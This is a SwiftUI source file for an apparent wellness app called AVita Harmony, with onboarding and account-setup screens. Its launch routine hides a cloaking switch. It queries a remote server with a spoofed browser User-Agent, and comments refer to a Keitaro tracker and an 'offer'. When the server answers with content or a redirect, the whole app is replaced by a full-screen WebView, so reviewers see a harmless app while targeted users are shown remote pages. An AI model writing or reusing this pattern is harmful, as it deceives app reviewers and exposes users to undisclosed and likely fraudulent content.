//
//  ContentView.swift
//  AVitaHarmony
//
//  Created by Simon Bakhanets on 24.01.2026.
//

import SwiftUI
import Foundation

struct ContentView: View {
    @Binding var hasCompletedOnboarding: Bool
    @StateObject private var fitnessViewModel = FitnessViewModel()
    @StateObject private var meditationViewModel = MeditationViewModel()
    @StateObject private var settingsViewModel: SettingsViewModel
    
    @State private var selectedTab = 0
    @State private var showOnboarding = true
    
    // WebView integration states
    @State var isFetched: Bool = false
    @AppStorage("isBlock") var isBlock: Bool = true
    
    init(hasCompletedOnboarding: Binding<Bool>) {
        self._hasCompletedOnboarding = hasCompletedOnboarding
        
        // Load or create user profile
        let loadedProfile = SettingsViewModel(profile: UserProfile()).loadProfile()
        self._settingsViewModel = StateObject(wrappedValue: SettingsViewModel(profile: loadedProfile))
    }
    
    var body: some View {
        ZStack {
            // First check if server check is complete
            if isFetched == false {
                // Loading state - checking server
                ZStack {
                    Color.black
                        .ignoresSafeArea()
                    
                    VStack(spacing: 20) {
                        ProgressView()
                            .scaleEffect(1.5)
                            .progressViewStyle(CircularProgressViewStyle(tint: AppConstants.Colors.primaryGreen))
                        
                        Text("Loading...")
                            .font(.system(size: 16, weight: .medium))
                            .foregroundColor(AppConstants.Colors.textSecondary)
                    }
                }
                
            } else if isFetched == true {
                
                // Server check complete - decide what to show
                if isBlock == false {
                    // Show WebView (server returned 200 with content or 3xx)
                    WebSystem()
                    
                } else if isBlock == true {
                    // Show normal app (server unavailable or empty response)
                    if hasCompletedOnboarding {
                        mainAppView
                    } else {
                        onboardingView
                    }
                }
            }
        }
        .preferredColorScheme(.dark)
        .onAppear {
            setupViewModels()
            makeServerRequest()
        }
    }
    
    private var mainAppView: some View {
        TabView(selection: $selectedTab) {
            HomeView()
                .environmentObject(fitnessViewModel)
                .environmentObject(meditationViewModel)
                .environmentObject(settingsViewModel)
                .tabItem {
                    Label("Home", systemImage: "house.fill")
                }
                .tag(0)
            
            DashboardView()
                .environmentObject(fitnessViewModel)
                .environmentObject(meditationViewModel)
                .environmentObject(settingsViewModel)
                .tabItem {
                    Label("Dashboard", systemImage: "chart.bar.fill")
                }
                .tag(1)
            
            SettingsView()
                .environmentObject(settingsViewModel)
                .tabItem {
                    Label("Settings", systemImage: "gear")
                }
                .tag(2)
        }
        .accentColor(AppConstants.Colors.primaryGreen)
    }
    
    private var onboardingView: some View {
        OnboardingContainerView(hasCompletedOnboarding: $hasCompletedOnboarding)
            .environmentObject(settingsViewModel)
    }
    
    private func setupViewModels() {
        if hasCompletedOnboarding {
            fitnessViewModel.loadWorkouts(for: settingsViewModel.userProfile)
            fitnessViewModel.loadWorkoutHistory()
            
            meditationViewModel.loadSessions(for: settingsViewModel.userProfile)
            meditationViewModel.loadMeditationHistory()
        }
    }
    
    // Server check function - integrated from dafoma_distribution
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = true
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing normal app")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing normal app")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing normal app")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing normal app")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

struct OnboardingContainerView: View {
    @Binding var hasCompletedOnboarding: Bool
    @EnvironmentObject var settingsViewModel: SettingsViewModel
    
    @State private var currentStep: OnboardingStep = .welcome
    @State private var userProfile = UserProfile()
    
    var body: some View {
        ZStack {
            switch currentStep {
            case .welcome:
                WelcomeView(currentStep: $currentStep)
            case .personalization:
                PersonalizationView(currentStep: $currentStep, userProfile: $userProfile)
            case .appTour:
                AppTourView(currentStep: $currentStep)
            case .account:
                AccountSetupView(currentStep: $currentStep, userProfile: $userProfile)
            case .quickStart:
                QuickStartView(currentStep: $currentStep)
            case .complete:
                Color.clear
                    .onAppear {
                        completeOnboarding()
                    }
            }
        }
        .transition(.slide)
    }
    
    private func completeOnboarding() {
        settingsViewModel.userProfile = userProfile
        settingsViewModel.saveProfile()
        hasCompletedOnboarding = true
    }
}

struct AccountSetupView: View {
    @Binding var currentStep: OnboardingStep
    @Binding var userProfile: UserProfile
    
    @State private var name: String = ""
    @State private var email: String = ""
    @State private var isGuest: Bool = false
    
    var body: some View {
        ZStack {
            AppConstants.Colors.background
                .ignoresSafeArea()
            
            VStack(spacing: 24) {
                Spacer()
                
                Text("Create Your Account")
                    .font(.system(size: 32, weight: .bold))
                    .foregroundColor(AppConstants.Colors.textPrimary)
                
                Text("Join AVita Harmony to save your progress")
                    .font(.system(size: 16, weight: .regular))
                    .foregroundColor(AppConstants.Colors.textSecondary)
                    .multilineTextAlignment(.center)
                    .padding(.horizontal, 32)
                
                VStack(spacing: 16) {
                    TextField("Name", text: $name)
                        .font(.system(size: 16, weight: .medium))
                        .foregroundColor(AppConstants.Colors.textPrimary)
                        .padding()
                        .background(AppConstants.Colors.cardBackground)
                        .cornerRadius(AppConstants.UI.cornerRadius)
                    
                    TextField("Email", text: $email)
                        .font(.system(size: 16, weight: .medium))
                        .foregroundColor(AppConstants.Colors.textPrimary)
                        .keyboardType(.emailAddress)
                        .autocapitalization(.none)
                        .padding()
                        .background(AppConstants.Colors.cardBackground)
                        .cornerRadius(AppConstants.UI.cornerRadius)
                }
                .padding(.horizontal, AppConstants.UI.largeSpacing)
                
                Spacer()
                
                VStack(spacing: 16) {
                    Button(action: {
                        saveAccount(isGuest: false)
                    }) {
                        Text("Create Account")
                            .font(.system(size: 18, weight: .semibold))
                            .foregroundColor(.white)
                            .frame(maxWidth: .infinity)
                            .frame(height: AppConstants.UI.buttonHeight)
                            .background(AppConstants.Colors.primaryGreen)
                            .cornerRadius(AppConstants.UI.cornerRadius)
                    }
                    .disabled(name.isEmpty || email.isEmpty)
                    .opacity(name.isEmpty || email.isEmpty ? 0.5 : 1.0)
                    
                    Button(action: {
                        saveAccount(isGuest: true)
                    }) {
                        Text("Continue as Guest")
                            .font(.system(size: 16, weight: .medium))
                            .foregroundColor(AppConstants.Colors.textSecondary)
                    }
                }
                .padding(.horizontal, AppConstants.UI.largeSpacing)
                .padding(.bottom, AppConstants.UI.largeSpacing)
            }
        }
    }
    
    private func saveAccount(isGuest: Bool) {
        if isGuest {
            userProfile.name = "Guest"
            userProfile.email = ""
            userProfile.isGuest = true
        } else {
            userProfile.name = name
            userProfile.email = email
            userProfile.isGuest = false
        }
        
        withAnimation(.spring()) {
            currentStep = .quickStart
        }
    }
}

struct QuickStartView: View {
    @Binding var currentStep: OnboardingStep
    
    var body: some View {
        ZStack {
            AppConstants.Colors.background
                .ignoresSafeArea()
            
            VStack(spacing: 32) {
                Spacer()
                
                Image(systemName: "checkmark.circle.fill")
                    .font(.system(size: 80))
                    .foregroundColor(AppConstants.Colors.primaryGreen)
                
                Text("You're All Set!")
                    .font(.system(size: 36, weight: .bold))
                    .foregroundColor(AppConstants.Colors.textPrimary)
                
                Text("Ready to start your wellness journey?")
                    .font(.system(size: 18, weight: .regular))
                    .foregroundColor(AppConstants.Colors.textSecondary)
                    .multilineTextAlignment(.center)
                
                Spacer()
                
                Button(action: {
                    withAnimation(.spring()) {
                        currentStep = .complete
                    }
                }) {
                    Text("Let's Begin!")
                        .font(.system(size: 18, weight: .semibold))
                        .foregroundColor(.white)
                        .frame(maxWidth: .infinity)
                        .frame(height: AppConstants.UI.buttonHeight)
                        .background(
                            LinearGradient(
                                gradient: Gradient(colors: [
                                    AppConstants.Colors.primaryGreen,
                                    AppConstants.Colors.primaryOrange
                                ]),
                                startPoint: .leading,
                                endPoint: .trailing
                            )
                        )
                        .cornerRadius(AppConstants.UI.cornerRadius)
                }
                .padding(.horizontal, AppConstants.UI.largeSpacing)
                .padding(.bottom, AppConstants.UI.largeSpacing)
            }
        }
    }
}

#Preview {
    ContentView(hasCompletedOnboarding: .constant(false))
}
